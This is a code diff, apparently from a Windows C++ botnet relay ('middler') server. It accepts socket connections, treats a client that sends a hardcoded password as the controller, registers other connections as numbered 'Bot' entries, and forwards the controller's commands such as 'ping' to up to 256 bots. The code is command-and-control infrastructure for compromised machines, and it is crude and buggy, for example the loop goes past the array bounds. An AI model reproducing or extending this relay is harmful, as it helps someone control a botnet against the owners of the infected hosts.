@@ -20,6 +20,11 @@ int hr;
 char msg[40];
 int s = sizeof(addr);
 
+void close()
+{
+	CloseHandle(hThreadB);
+}
+
 void Wsa()
 {
 	WSADATA wsaData;
@@ -55,24 +60,23 @@ DWORD WINAPI inff(LPVOID g)
 	while (true)
 	{
 		cout << "1" << endl;
-		Sleep(1000);
 		sock = accept(sListen, (SOCKADDR*)&addr, &s);
-		cout << "2" << endl;
-		Sleep(1000);
+		cout << "2" << endl;;
 		recv(sock, msg2, sizeof(msg2), NULL);
 		cout << msg2 << 3 << endl;
-		Sleep(1000);
 		//memcpy(gg, msg2, sizeof(msg2));
 		gg = msg2;
 		if (gg == "v86[wmxFBdX#5nb)rR@}MSzcu>ZC{j")
 		{
 			Con[0] = sock;
-			cout << "4" << endl;
-			Sleep(1000);
+			cout << "4" << endl;;
 			cout << "Client connected" << endl;
 			hThreadB = CreateThread(NULL, NULL, reces, NULL, NULL, &IDThread);
 		}
-		else { Con[d] = sock; d++; cout << "Bot" << d << " connected to middler." << endl; cout << "5" << endl; Sleep(1000);
+		if (gg == "m")
+		{
+			Con[d] = sock; d++;
+			cout << "Bot" << d << " connected to middler." << endl; cout << "5" << endl;
 		}
 		if (d == 256) { d = 1; }
 	}
@@ -82,54 +86,46 @@ DWORD WINAPI inff(LPVOID g)
 
 DWORD WINAPI reces(LPVOID d)
 {
-	hr = 1;
+	t7:
+	char msg [40] = "Ready to new command";
 	string m;
-t7:
-	cout << "6" << endl;
-	Sleep(1000);
-	char msg[40] = "v86[wmxFBdX#5nb)rR@}MSzcu>ZC{j";
-	cout << msg << 7 << endl;
-	Sleep(1000);
-	recv(Con[0], msg, sizeof(msg), NULL);
-	cout << msg << 8 << endl;
-	Sleep(1000);
-	while (true)
-	{	
+	cout << msg << endl;
+	if (recv(Con[0], msg, sizeof(msg), NULL) == 0)
+	{
+		cout << "Client Disconnected" << endl;
+		close();
+	}
+	else
+	{
 		m = msg;
-		cout << "9" << endl;
-		Sleep(1000);
-		if (m != "v86[wmxFBdX#5nb)rR@}MSzcu>ZC{j")
+		if (m =="ping" || m == "12")
 		{
-			
-			cout << "10" << endl;
-			Sleep(1000);
-			while (hr <= 256)
-			{
-				send(Con[hr], msg, sizeof(msg), NULL);
-				closesocket(Con[hr]);
-				Sleep(100);
-				//hThreadC = CreateThread(NULL, NULL, inff, NULL, NULL, &IDThread);
-				hr++;
-			}	
-			//CloseHandle(hThreadC);
-			hr = 1;
-			cout << "16" << endl;
-			Sleep(1000);
-			cout << "sent" << endl;
-			
-			cout << m << endl;
 
+			for (int i = 0; i <= 256; i++)
+			{
+				cout << i << "=" << msg<<endl;
+				send(Con[i], msg, sizeof(msg), NULL);
+				closesocket(Con[i]);
+				Sleep(100);
+			}
+			
 		}
 		goto t7;
 	}
+
 	return 0;
 }
 
-
+void sett()
+{
+	send(Con[hr], msg, sizeof(msg), NULL);
+	closesocket(Con[hr]);
+	Sleep(100);
+}
 
 DWORD WINAPI setn(LPVOID d)
 {
-
+	sett();
 	return 0;
 }
 
@@ -146,8 +142,6 @@ int main()
 	WaitForSingleObject(hThread, INFINITE);
 	WaitForSingleObject(hThreadB, INFINITE);
 	WaitForSingleObject(hThreadC, INFINITE);
-	//WaitForSingleObject(hThreadC, INFINITE);
-
 
 	return 0;
 }
